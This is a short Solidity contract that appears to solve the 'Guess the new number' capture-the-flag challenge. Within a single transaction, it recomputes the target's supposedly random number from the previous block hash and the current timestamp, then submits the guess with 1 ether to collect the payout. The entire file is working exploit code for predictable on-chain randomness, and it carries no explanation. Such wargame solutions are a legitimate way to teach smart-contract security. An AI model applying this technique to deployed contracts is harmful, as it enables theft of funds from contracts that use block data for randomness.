pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolution {
    function GuessTheNewNumberSolution(address levelAddress) public payable {
        require(msg.value == 1 ether);
        IGuessTheNewNumberChallenge level = IGuessTheNewNumberChallenge(levelAddress);
        level.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }
}
